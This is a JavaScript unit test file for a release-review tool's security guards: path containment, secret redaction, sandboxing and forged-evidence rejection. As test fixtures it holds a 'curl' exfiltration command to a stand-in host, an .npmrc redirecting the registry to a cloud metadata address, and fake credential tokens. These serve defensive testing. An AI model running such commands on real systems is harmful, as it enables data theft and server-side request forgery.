/**
 * Unit Tests for Release Quality Review Scripts
 *
 * Run with: npm test
 *
 * Tests import production code from lib/review-utils.mjs - no simplified reimplementations.
 *
 * Tests:
 * 1. parseYamlProfile - YAML profile parsing (from production code)
 * 2. parseScore - Score extraction from markdown (from production code)
 * 3. detectChangeScale - Change scale detection (from production code)
 * 4. Phase persistence functions
 * 5. parseYamlResult - result.yaml parsing (from production code)
 */

import { chmodSync, copyFileSync, readFileSync, writeFileSync, mkdirSync, existsSync, rmSync, rmdirSync, symlinkSync, mkdtempSync, cpSync } from 'fs';
import { join, relative } from 'path';
import { tmpdir, userInfo } from 'node:os';
import { fileURLToPath } from 'url';
import { spawnSync } from 'node:child_process';
import { createHash, randomUUID } from 'node:crypto';
import test from 'node:test';
import {
  parseScore,
  parseBlockers,
  parseYamlResult,
  calculateReviewerTimeout,
  detectChangeScale,
  parseYamlProfile,
  matchesTriggerConditions,
  selectReviewers,
  findTrivialVerificationScripts,
  hasConcreteVerificationOutput,
  CLEAN_CANDIDATE_COMMANDS,
  ROLLBACK_COMMANDS,
  validateCleanCandidateEvidence,
  validateRollbackEvidence,
  validateResultYamlContract,
  strictAutomatedChecksPassed,
} from '../lib/review-utils.mjs';
import {
  resolveWithinRoot,
  resolveReportDirectory,
  ensureContainedDirectorySync,
  isPathWithin,
  isRealDirectory,
  shouldIncludeCanonicalFile,
  containsSensitiveText,
  createCandidateSubprocessEnv,
  createSubprocessEnv,
  outerSandboxAttestationFromEnv,
  redactSensitiveText,
  wrapCandidateCommand,
  readContainedFileSync,
  writeContainedFileSync,
  writeContainedFile,
} from '../lib/security-utils.mjs';
import {
  extractResultScoresFromRound, persistPhasePlan, persistPhaseResult,
} from '../lib/phase-persistence.mjs';
import {
  checkFindingEvidenceBindings, checkMissingEvidenceOutput, extractCommandEvidence,
  extractFileLineReferences, extractTestOutputs,
  resolveFileReference,
} from '../lib/evidence-utils.mjs';
import { detectChangeScale as detectGateChangeScale, printScaleDetection } from '../scripts/modules/scale.mjs';
import { printHelp as printGateHelp } from '../scripts/modules/cli.mjs';
import {
  collectEvidence, formatGitEvidenceFailure, prepareTrustedAuditWorkspace,
  runAutomatedChecks, runEvidenceCommand,
} from '../scripts/modules/evidence.mjs';
import { validateVerificationCommands } from '../scripts/modules/verification-policy.mjs';
import { createCandidateRuntime, validateCandidateCheckoutIdentity } from '../lib/candidate-runtime.mjs';
import {
  extractRadarCandidates, fetchRadarReviewerModel, selectRadarReviewerModel,
} from '../lib/model-selector.mjs';

const __dirname = fileURLToPath(new URL('.', import.meta.url));
const SKILL_DIR = join(__dirname, '..');
const PROJECT_ROOT = join(SKILL_DIR, '..', '..');
const TEST_ROOT = join(tmpdir(), 'release-quality-review-tests');
const TEST_DIR = join(TEST_ROOT, `${process.pid}-${randomUUID()}`);
const TEST_CODEX_MODEL = 'gpt-test-review';
const TEST_CLAUDE_MODEL = 'claude-test-review';
const ROUND_BASE = process.pid * 10;
const TEST_ROUNDS = {
  veto: ROUND_BASE + 1,
  runner: ROUND_BASE + 2,
  rehydrate: ROUND_BASE + 3,
  missingEvidence: ROUND_BASE + 4,
  parallelTimeout: ROUND_BASE + 5,
  parallelSuccess: ROUND_BASE + 6,
  evidenceForgery: ROUND_BASE + 7,
};
const reportRound = round => join(resolveReportDirectory(PROJECT_ROOT), `round-${String(round).padStart(3, '0')}`);

function radarSnapshot(comparisons, updatedAt = '2026-07-17T10:00:00+08:00') {
  return { schema_version: '2.0', model_iq: { updated_at: updatedAt, comparisons } };
}

// Create test directory at module load time
mkdirSync(TEST_DIR, { recursive: true });

// ============================================================================
// Test Utilities
// ============================================================================

function createMockFs(profileName, content) {
  const mockFile = join(TEST_DIR, `${profileName}.yaml`);
  writeFileSync(mockFile, content);
  return mockFile;
}

function assertEqual(actual, expected, message) {
  if (actual !== expected) {
    throw new Error(`${message}: expected ${expected}, got ${actual}`);
  }
}

function assertTrue(condition, message) {
  if (!condition) {
    throw new Error(message);
  }
}

async function assertRejects(promise, expectedMessage) {
  let message = '';
  try {
    await promise;
  } catch (error) {
    message = error.message;
  }
  assertTrue(message.includes(expectedMessage), `Expected rejection containing ${expectedMessage}, got ${message}`);
}

// ============================================================================
// TESTS - parseYamlProfile (imported from production)
// ============================================================================

test.describe('security boundaries', () => {
  test('sandboxed Git evidence failures include the host recovery action', () => {
    const message = formatGitEvidenceFailure(new Error('outer sandbox capability check failed closed'));
    assertTrue(message.includes('outer sandbox capability check failed closed'));
    assertTrue(message.includes('Run from a normal macOS host shell or supported CI runner.'));
  });

  test('collector preserves sandbox root cause and recovery action on first Git failure', () => {
    let message = '';
    try {
      collectEvidence({}, PROJECT_ROOT, 'HEAD', 'HEAD', SKILL_DIR, () => {
        throw new Error('outer sandbox capability check failed closed');
      });
    } catch (error) {
      message = error.message;
    }
    assertTrue(message.includes('outer sandbox capability check failed closed'));
    assertTrue(message.includes('Run from a normal macOS host shell or supported CI runner.'));
    assertEqual(message.includes('source checkout must be clean'), false);
  });

  test('rejects paths that escape the repository', () => {
    let rejected = false;
    try {
      resolveWithinRoot('/tmp/repository', '../escaped.md', 'adapter');
    } catch {
      rejected = true;
    }
    assertTrue(rejected, 'Expected path traversal to be rejected');
    let absoluteRejected = false;
    try {
      resolveWithinRoot('/tmp/repository', '/tmp/absolute.md', 'adapter');
    } catch {
      absoluteRejected = true;
    }
    assertTrue(absoluteRejected, 'Expected absolute paths to be rejected');
  });

  test('accepts paths contained by the repository', () => {
    assertEqual(
      resolveWithinRoot('/tmp/repository', '.claude/agents/reviewer.md', 'adapter'),
      '/tmp/repository/.claude/agents/reviewer.md'
    );
  });

  test('excludes platform metadata from canonical hashes', () => {
    assertEqual(shouldIncludeCanonicalFile('.DS_Store'), false);
    assertEqual(shouldIncludeCanonicalFile('SKILL.md'), true);
  });

  test('redacts common credential formats', () => {
    const input = [
      'Authorization: Bearer provider-token',
      '{"token":"json-token"}',
      'https://user:password@example.com/path',
      'Cookie: session=secret-value',
      '-----BEGIN RSA PRIVATE KEY-----\nabc123\n-----END RSA PRIVATE KEY-----',
    ].join('\n');
    const redacted = redactSensitiveText(input);
    for (const secret of ['provider-token', 'json-token', 'user:password', 'secret-value', 'abc123']) {
      assertEqual(redacted.includes(secret), false, `Expected ${secret} to be redacted`);
    }
  });

  test('redacts standalone provider tokens and JWT-shaped values', () => {
    const secrets = [
      'ghp_abcdefghijklmnopqrstuvwxyz1234567890',
      'github_pat_abcdefghijklmnopqrstuvwxyz1234567890',
      'glpat-abcdefghijklmnopqrstuvwxyz1234567890',
      'npm_abcdefghijklmnopqrstuvwxyz1234567890',
      'slack-token-test-placeholder-abcdefghijklmnopqrstuvwxyz',
      'AIzaabcdefghijklmnopqrstuvwxyz1234567890',
      'sk_live_abcdefghijklmnopqrstuvwxyz1234567890',
      'sk-proj-abcdefghijklmnopqrstuvwxyz1234567890',
      'AKIAIOSFODNN7EXAMPLE',
      'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signaturevalue',
      'Bearer standalone-provider-token',
    ];
    const redacted = redactSensitiveText(secrets.join('\n'));
    for (const secret of secrets) {
      assertEqual(containsSensitiveText(secret), true, `Expected ${secret} to be detected`);
      assertEqual(redacted.includes(secret), false, `Expected ${secret} to be redacted`);
    }
  });

  test('builds a least-privilege subprocess environment', () => {
    const env = createSubprocessEnv({
      PATH: '/usr/bin', HOME: '/tmp/home', LANG: 'en_US.UTF-8', NODE_TEST_CONTEXT: 'child-v8',
      OPENAI_API_KEY: ['sk', 'proj-abcdefghijklmnopqrstuvwxyz'].join('-'),
      AMBIENT_SECRET_CANARY: 'must-not-cross',
    });
    assertEqual(env.PATH, '/usr/bin');
    assertEqual(env.HOME, '/tmp/home');
    assertEqual(env.LANG, 'en_US.UTF-8');
    assertEqual(env.NODE_TEST_CONTEXT, 'child-v8');
    assertEqual(env.OPENAI_API_KEY, undefined);
    assertEqual(env.AMBIENT_SECRET_CANARY, undefined);
    const candidateEnv = createCandidateSubprocessEnv({
      PATH: '/usr/bin', HOME: '/real-home', CODEX_HOME: '/real-codex', OPENAI_API_KEY: 'hidden',
    }, '/isolated-home');
    assertEqual(candidateEnv.PATH, '/usr/bin');
    assertEqual(candidateEnv.HOME, '/isolated-home');
    assertEqual(candidateEnv.TMPDIR, '/isolated-home');
    assertEqual(candidateEnv.CODEX_HOME, undefined);
    assertEqual(candidateEnv.OPENAI_API_KEY, undefined);
  });

  test('detects quoted and unquoted generic secret assignments', () => {
    for (const value of [
      'password=correct-horse-battery-staple',
      'token=plain-secret-value',
      'api_key=plain-secret-value',
      'CUSTOM_API_KEY=abcdefghijklmnopqrstuvwxyz123456',
    ]) assertEqual(containsSensitiveText(value), true, `Expected sensitive assignment: ${value.split('=')[0]}`);
  });

  test('rejects forged clean-candidate command and tree evidence', () => {
    const now = new Date().toISOString();
    const clean = {
      schema_version: 1, candidate_commit: 'commit', candidate_tree: 'tree',
      isolated_commit: 'commit', isolated_tree: 'tree', source_status: '', final_source_status: '',
      isolated_checkout: true, status: 'pass', exit_code: 0,
      commands: CLEAN_CANDIDATE_COMMANDS.map(([id, command]) => {
        const output = id === 'test' ? '# tests 1\n# fail 0\n'
          : id === 'coverage' ? '# start of coverage report\n' : '';
        return {
          id, command, started_at: now, finished_at: now, exit_code: 0, status: 'pass',
          output, output_bytes: Buffer.byteLength(output), truncated: false,
        };
      }),
    };
    assertEqual(validateCleanCandidateEvidence(clean, 'commit', 'tree'), true);
    assertEqual(validateCleanCandidateEvidence({ ...clean, candidate_tree: 'forged' }, 'commit', 'tree'), false);
    const forgedCommands = structuredClone(clean);
    forgedCommands.commands = [{ id: 'forged', command: 'forged', exit_code: 0, status: 'pass' }];
    assertEqual(validateCleanCandidateEvidence(forgedCommands, 'commit', 'tree'), false);
    const substitutedCommand = structuredClone(clean);
    substitutedCommand.commands[2].command = 'printf [REDACTED]';
    assertEqual(validateCleanCandidateEvidence(substitutedCommand, 'commit', 'tree'), false);
  });

  test('validates structured rollback evidence and rejects forged trees', () => {
    const now = new Date().toISOString();
    const outputs = ['', '', 'candidate', 'candidate-tree', '', 'base-tree', '10.33.0', '', '# tests 0\n# pass 0\n', ''];
    const rollback = {
      schema_version: 1,
      candidate_commit: 'candidate',
      candidate_tree: 'candidate-tree',
      base_commit: 'base',
      base_tree: 'base-tree',
      isolated_commit: 'candidate',
      isolated_tree: 'candidate-tree',
      rollback_tree: 'base-tree',
      source_status: '',
      final_source_status: '',
      isolated_checkout: true,
      status: 'pass',
      exit_code: 0,
      commands: ROLLBACK_COMMANDS.map(([id, command], index) => ({
        id,
        command,
        started_at: now,
        finished_at: now,
        exit_code: 0,
        status: 'pass',
        output: outputs[index],
        output_bytes: Buffer.byteLength(outputs[index]),
        truncated: false,
      })),
    };
    assertEqual(validateRollbackEvidence(rollback, 'candidate', 'candidate-tree', 'base', 'base-tree'), true);
    assertEqual(validateRollbackEvidence({ ...rollback, rollback_tree: 'forged' }, 'candidate', 'candidate-tree', 'base', 'base-tree'), false);
    const missingTranscript = structuredClone(rollback);
    missingTranscript.commands[8].output = '';
    missingTranscript.commands[8].output_bytes = 0;
    assertEqual(validateRollbackEvidence(missingTranscript, 'candidate', 'candidate-tree', 'base', 'base-tree'), false);
  });

  test('filesystem sandbox denies the host home outside allowed roots', { skip: process.platform !== 'darwin' }, t => {
    const probe = spawnSync('/usr/bin/sandbox-exec', [
      '-p', '(version 1) (allow default)', '/usr/bin/true',
    ], { encoding: 'utf8' });
    if (probe.status !== 0 && /sandbox_apply:\s*Operation not permitted/i.test(`${probe.stdout}${probe.stderr}`)) {
      const previousAttested = process.env.RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED;
      process.env.RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED = '1';
      try {
        let errorMessage = '';
        try {
          wrapCandidateCommand(process.execPath, ['-e', ''], { allowedRoots: [PROJECT_ROOT] });
        } catch (error) {
          errorMessage = error.message;
        }
        assertTrue(errorMessage.includes('nested execution fails closed'),
          'Ambient attestation must not authorize fallback');
        if (process.env.RELEASE_QUALITY_OUTER_SANDBOX_READ_CANARY) {
          const wrapped = wrapCandidateCommand(process.execPath, ['-e', ''], {
            allowedRoots: [PROJECT_ROOT],
            outerSandboxAttestation: {
              attested: true,
              readCanary: process.env.RELEASE_QUALITY_OUTER_SANDBOX_READ_CANARY,
              writeCanary: process.env.RELEASE_QUALITY_OUTER_SANDBOX_WRITE_CANARY,
            },
          });
          assertEqual(wrapped?.command, process.execPath, errorMessage);
        }
      } finally {
        if (previousAttested === undefined) delete process.env.RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED;
        else process.env.RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED = previousAttested;
      }
      return;
    }
    const hostHome = userInfo().homedir;
    const script = `const fs=require('node:fs');if(!fs.existsSync('package.json'))process.exit(2);try{fs.readdirSync(${JSON.stringify(hostHome)});process.exit(3)}catch{}try{fs.readdirSync(${JSON.stringify(TEST_DIR)});process.exit(4)}catch{}`;
    const wrapped = wrapCandidateCommand(process.execPath, ['-e', script], {
      allowedRoots: [PROJECT_ROOT], hostHome,
    });
    const result = spawnSync(wrapped.command, wrapped.args, { cwd: PROJECT_ROOT, encoding: 'utf8' });
    assertEqual(result.status, 0, result.stderr);

    const isolated = join(TEST_DIR, 'nested-write-root');
    mkdirSync(isolated, { recursive: true });
    const protectedTarget = join(PROJECT_ROOT, 'quality-reports', `.nested-write-${randomUUID()}`);
    const childScript = `require('node:fs').writeFileSync(${JSON.stringify(protectedTarget)},'forged')`;
    const nestedScript = `const{spawnSync}=require('node:child_process');const r=spawnSync(process.execPath,['-e',${JSON.stringify(childScript)}]);process.exit(r.status===0?5:0)`;
    const outer = wrapCandidateCommand(process.execPath, ['-e', nestedScript], {
      readOnlyRoots: [PROJECT_ROOT], writeRoots: [isolated], hostHome,
    });
    const nested = spawnSync(outer.command, outer.args, { cwd: PROJECT_ROOT, encoding: 'utf8' });
    assertEqual(nested.status, 0, nested.stderr);
    assertEqual(existsSync(protectedTarget), false, 'Nested candidate must not write the real report root');
  });

  test('candidate evidence output is redacted before persistence', () => {
    const record = runEvidenceCommand('fixture', PROJECT_ROOT, () => 'token=abcdefghijklmnop');
    assertEqual(record.status, 'pass');
    assertEqual(containsSensitiveText(record.output), false);
    assertTrue(record.output.includes('[REDACTED]'), 'Expected redacted evidence output');
  });

  test('silent evidence timeout preserves an actionable failure record', () => {
    const timeout = new Error('spawnSync /bin/sh ETIMEDOUT');
    timeout.code = 'ETIMEDOUT';
    timeout.signal = 'SIGTERM';
    timeout.status = null;
    const record = runEvidenceCommand('fixture', PROJECT_ROOT, () => { throw timeout; });
    assertEqual(record.status, 'fail');
    assertEqual(record.timed_out, true);
    assertEqual(record.timeout_ms, 30000);
    assertEqual(record.signal, 'SIGTERM');
    assertTrue(record.output.includes('timed out after 30000ms'));
  });

  test('candidate config cannot substitute the network-enabled audit command', () => {
    const candidateCommands = [];
    let trustedAuditRuns = 0;
    const record = command => ({
      command, status: 'pass', exit_code: 0, output: 'passed', output_bytes: 6, truncated: false,
      started_at: new Date().toISOString(), finished_at: new Date().toISOString(),
    });
    const checks = runAutomatedChecks(
      { verification: {
        test: 'npm test', typecheck: 'npm run typecheck', build: 'npm run build', lint: 'npm run lint',
        coverage: 'npm run coverage', e2e: 'npm run test:e2e', audit: 'curl https://example.invalid/exfiltrate',
      } },
      PROJECT_ROOT,
      PROJECT_ROOT,
      command => { candidateCommands.push(command); return record(command); },
      () => { trustedAuditRuns++; return record('npm audit --audit-level=high'); },
    );
    assertEqual(candidateCommands.includes('curl https://example.invalid/exfiltrate'), false);
    assertEqual(trustedAuditRuns, 1);
    assertEqual(checks.auditGate.command, 'npm audit --audit-level=high');
  });

  test('verification policy rejects shell-shaped candidate commands', () => {
    let message = '';
    try {
      validateVerificationCommands({
        test: 'sh -c "printf fake"', typecheck: 'npm run typecheck', build: 'npm run build',
        lint: 'npm run lint', audit: 'npm audit --audit-level=high', coverage: 'npm run coverage',
        e2e: 'npm run test:e2e',
      });
    } catch (error) {
      message = error.message;
    }
    assertTrue(message.includes('trivial or missing verification scripts'));
  });

  test('trusted audit workspace excludes candidate npm configuration', () => {
    const candidate = join(TEST_DIR, 'audit-candidate');
    const isolatedHome = join(TEST_DIR, 'audit-home');
    mkdirSync(candidate, { recursive: true });
    mkdirSync(isolatedHome, { recursive: true });
    writeFileSync(join(candidate, 'package.json'), '{"name":"fixture","version":"1.0.0"}');
    writeFileSync(join(candidate, 'package-lock.json'), '{"name":"fixture","lockfileVersion":3,"packages":{}}');
    writeFileSync(join(candidate, '.npmrc'), 'registry=http://169.254.169.254/candidate-prefix/');
    const prepared = prepareTrustedAuditWorkspace(candidate, isolatedHome);
    assertEqual(existsSync(join(prepared.auditRoot, '.npmrc')), false);
    assertEqual(readFileSync(prepared.userConfig, 'utf8'), '');
    assertEqual(readFileSync(prepared.globalConfig, 'utf8'), '');
    assertEqual(existsSync(join(prepared.auditRoot, 'package-lock.json')), true);
  });

  test('rejects symlinked package manifests before audit or verification', () => {
    const candidate = join(TEST_DIR, 'symlink-manifest-candidate');
    const isolatedHome = join(TEST_DIR, 'symlink-manifest-home');
    mkdirSync(candidate, { recursive: true });
    mkdirSync(isolatedHome, { recursive: true });
    const outside = join(TEST_DIR, 'outside-package.json');
    writeFileSync(outside, '{"name":"outside"}');
    symlinkSync(outside, join(candidate, 'package.json'));
    let message = '';
    try {
      prepareTrustedAuditWorkspace(candidate, isolatedHome);
    } catch (error) {
      message = error.message;
    }
    assertTrue(message.includes('must not be a symbolic link'));
  });

  test('rejects a repository output parent symlinked outside the repository', async () => {
    const link = join(TEST_DIR, 'outside-link');
    symlinkSync('/tmp', link, 'dir');
    let rejected = false;
    try {
      await writeContainedFile(PROJECT_ROOT, join(link, 'must-not-write.txt'), 'blocked');
    } catch {
      rejected = true;
    }
    assertEqual(rejected, true);
  });

  test('rejects symbolic links inside contained output directory paths', () => {
    const root = join(TEST_DIR, 'contained-symlink-root');
    const target = join(root, 'target');
    const link = join(root, 'link');
    mkdirSync(target, { recursive: true });
    symlinkSync(target, link, 'dir');
    let message = '';
    try {
      ensureContainedDirectorySync(root, join(link, 'child'));
    } catch (error) {
      message = error.message;
    }
    assertTrue(message.includes('must not be a symbolic link'), `Expected explicit symlink rejection: ${message}`);
  });

  test('writes contained files through production filesystem guards', async () => {
    const root = join(TEST_DIR, 'contained-files');
    mkdirSync(root, { recursive: true });
    const syncFile = join(root, 'sync', 'record.txt');
    writeContainedFileSync(root, syncFile, 'one');
    assertEqual(readContainedFileSync(root, syncFile), 'one');
    writeContainedFileSync(root, syncFile, 'two');
    assertEqual(readContainedFileSync(root, syncFile), 'two');

    const asyncFile = join(root, 'async', 'record.txt');
    await writeContainedFile(root, asyncFile, 'async');
    assertEqual(readContainedFileSync(root, asyncFile), 'async');
  });
});

test.describe('fail-closed result parsing', () => {
  test('returns an empty result for missing YAML', () => {
    const parsed = parseYamlResult(null);
    assertEqual(parsed.reviewer, null);
    assertEqual(parsed.score, null);
    assertEqual(parsed.blockers.length, 0);
    assertEqual(parsed.redlines.length, 0);
  });

  test('parses inline blocker and redline arrays', () => {
    const parsed = parseYamlResult(`reviewer: destructive-qa\nscore: 100\nstatus: fail\nblockers: [P1]\nredlines: [P0]\n`);
    assertEqual(parsed.status, 'fail');
    assertEqual(parsed.blockers.length, 1);
    assertEqual(parsed.redlines.length, 1);
  });

  test('parses and retains packet profile and round identity', () => {
    const parsed = parseYamlResult(`reviewer: destructive-qa\nprofile: agentic-release-gate\nround: 5\ncandidate_commit: 1111111111111111111111111111111111111111\ncandidate_tree: 2222222222222222222222222222222222222222\nscore: 95\nstatus: pass\nreview_backend: codex\nreview_model: gpt-test-review\nblockers: []\nredlines: []\n`);
    assertEqual(parsed.profile, 'agentic-release-gate');
    assertEqual(parsed.round, 5);
    assertEqual(parsed.candidateCommit, '1111111111111111111111111111111111111111');
    assertEqual(parsed.candidateTree, '2222222222222222222222222222222222222222');
    assertEqual(parsed.reviewBackend, 'codex');
    assertEqual(parsed.reviewModel, 'gpt-test-review');
  });
});

test.describe('no-blocker parsing', () => {
  test('does not treat canonical empty P0/P1 sections as vetoes', () => {
    assertEqual(parseBlockers('# Blockers\n\n## P0\nNone.\n\n## P1\nNone.\n').length, 0);
    for (const heading of [
      '## P0 (Must Fix)', '## P1 (Must Fix Before Release)', '## P0 / Red Lines',
    ]) assertEqual(parseBlockers(`${heading}\nNone.\n`).length, 0, heading);
    const chineseEmptyP0 = `## P0 (Red Lines)

无。本轮未发现红线。

## P1 (Must Fix Before Release)

### P1 - Real blocker

Evidence: reproducible
`;
    const parsed = parseBlockers(chineseEmptyP0);
    assertEqual(parsed.length, 1, `Empty localized P0 section must not become a blocker: ${JSON.stringify(parsed)}`);
    assertTrue(parsed[0].includes('Real blocker'), JSON.stringify(parsed));
  });

  test('accepts case-insensitive no-blocker sentences', () => {
    assertEqual(parseBlockers('No P0/P1 blockers.').length, 0);
    assertEqual(parseBlockers('NO P0 OR P1 BLOCKERS.').length, 0);
  });

  test('ignores labeled empty severity sections with dash separators', () => {
    assertEqual(parseBlockers('## P0 — Redlines\n\nNone.\n\n## P1 — Must fix before release\n\nNone.\n').length, 0);
  });

  test('retains titled P0/P1 headings and ignores unrelated checklists', () => {
    for (const heading of ['## P0 — Hidden veto', '## P1 - Hidden veto', '## P0: Hidden veto', '## P1 (Hidden veto)']) {
      const parsed = parseBlockers(`${heading}\nEvidence: reproducible\n`);
      assertEqual(parsed.length, 1, `Expected titled severity heading to be retained: ${heading}`);
    }
    assertEqual(parseBlockers('- [ ] Overall score >= 90\n- [x] No P0/P1 blocker\n').length, 0);
  });
});

test('binds every machine blocker and redline to evidence in its own Markdown section', () => {
  const unrelated = [1, 2, 3, 4, 5]
    .map(line => `skills/release-quality-review/lib/review-utils.mjs:${line}`)
    .join('\n');
  const finding = 'P1 DQA-TEST-P1-01: unsafe identity';
  assertEqual(checkFindingEvidenceBindings(
    [finding],
    `## Unrelated evidence\n${unrelated}\n\n## DQA-TEST-P1-01\nUnsafe identity is claimed without evidence.\n`,
  ).length, 1);
  assertEqual(checkFindingEvidenceBindings(
    [finding],
    '## DQA-TEST-P1-01\nEvidence: skills/release-quality-review/lib/model-selector.mjs:20\n',
  ).length, 0);
});

process.on('exit', () => {
  try {
    rmSync(TEST_DIR, { recursive: true });
    rmdirSync(TEST_ROOT);
  } catch {
    // Another test worker may still own the shared parent.
  }
});
